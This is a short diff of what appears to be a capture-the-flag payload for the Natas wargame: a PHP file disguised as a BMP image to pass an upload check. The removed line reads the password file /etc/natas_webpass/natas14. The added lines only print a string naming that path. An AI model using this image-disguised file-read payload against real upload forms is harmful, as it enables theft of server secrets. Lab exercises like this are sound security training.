@@ -1,5 +1,6 @@
 BMP
 
 <?php
-echo file_get_contents("/etc/natas_webpass/natas14")
+$key = "oh no";
+echo "\"$key\"/etc/natas_webpass/natas14"
 ?>
